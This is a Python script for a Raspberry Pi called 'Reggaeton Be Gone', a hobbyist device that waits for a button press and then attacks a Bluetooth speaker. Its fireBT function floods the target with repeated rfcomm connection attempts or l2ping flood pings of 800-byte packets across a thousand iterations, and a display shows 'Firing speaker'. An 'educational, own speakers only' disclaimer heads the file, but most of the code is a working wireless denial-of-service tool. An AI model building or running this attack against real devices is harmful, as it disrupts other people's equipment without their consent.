#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Reggaeton Be Gone (Versión sin IA)
# Roni Bandini @RoniBandini https://bandini.medium.com
# February 2024 V 1.0 (Sucio y Desprolijo, as Pappo said)
# MIT License (c) 2024 Roni Bandini
# Disclaimer: este es un proyecto educativo. Úselo con sus propios altavoces BT.

import os
import subprocess
import sys
import signal
import time
import datetime
from luma.core.interface.serial import i2c
from luma.oled.device import ssd1306
from PIL import Image, ImageDraw, ImageFont
from RPi import GPIO

# Configuración de la pantalla OLED I2C SSD1306 de 0.96 pulgadas
serial = i2c(port=1, address=0x3C)
disp = ssd1306(serial)

# Configuración de imagen
width = disp.width
height = disp.height
image = Image.new('1', (width, height))
draw = ImageDraw.Draw(image)

# Fuente para el texto
font = ImageFont.load_default()

# Configuración del botón
buttonPin = 26
GPIO.setwarnings(False)
GPIO.setmode(GPIO.BCM)
GPIO.setup(buttonPin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

# Configuración del ataque Bluetooth
myPath = "/home/pi/reggaeton/"
method = 1  # Método de ataque
targetAddr = ":::::"  # Dirección del dispositivo de destino
packagesSize = 800
threadsCount = 1000
myDelay = 0.1
forceFire = 0

def writeLog(myLine):
    now = datetime.datetime.now()
    dtFormatted = now.strftime("%Y-%m-%d %H:%M:%S")
    with open('log.txt', 'a') as f:
        myLine = str(dtFormatted) + "," + myLine
        f.write(myLine + "\n")

def updateScreen(message1, message2):
    # Limpiar la pantalla
    draw.rectangle((0, 0, width, height), outline=0, fill=0)
    # Mostrar los mensajes
    draw.text((0, 0), "Reggaeton BeGone", font=font, fill=255)
    draw.text((0, 16), message1, font=font, fill=255)
    draw.text((0, 32), message2, font=font, fill=255)
    disp.display(image)

def fireBT(method, targetAddr, threadsCount, packagesSize, myDelay):
    writeLog("Firing with method #" + str(method) + ", pkg " + str(packagesSize) + ', target ' + targetAddr)
    if method == 1:
        for i in range(threadsCount):
            print('[*] ' + str(i + 1))
            subprocess.call(['rfcomm', 'connect', targetAddr, '1'])
            time.sleep(myDelay)
    elif method == 2:
        for i in range(threadsCount):
            print('[*] ' + str(i + 1))
            os.system('l2ping -i hci0 -s ' + str(packagesSize) + ' -f ' + targetAddr)
            time.sleep(myDelay)
    elif method == 3:
        for i in range(threadsCount):
            print('[*] Sorry, Scarface method is not included in this version ' + str(i + 1))
            time.sleep(myDelay)

def signal_handler(sig, frame):
    print('Interrupted')
    writeLog("Interrupted")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def main(argv):
    print("")
    print("Reggaeton Be Gone 1.0 (Sin IA)")
    print("@RoniBandini, February 2024")
    print("Direct attack mode initiated")
    print("Waiting for button...")
    print("")

    writeLog("Started")

    # Display
    updateScreen(targetAddr, "Method #" + str(method))
    time.sleep(3)

    # Esperar a que se presione el botón
    while GPIO.input(buttonPin) == GPIO.HIGH:
        time.sleep(1)

    writeLog("Button pressed, firing")
    updateScreen("Firing speaker", "")
    print("Firing...")

    # Mostrar el logo y ejecutar el ataque
    image = Image.open(myPath + 'images/logo.png').convert('1')
    disp.display(image)

    fireBT(method, targetAddr, threadsCount, packagesSize, myDelay)

if __name__ == '__main__':
    main(sys.argv[1:])
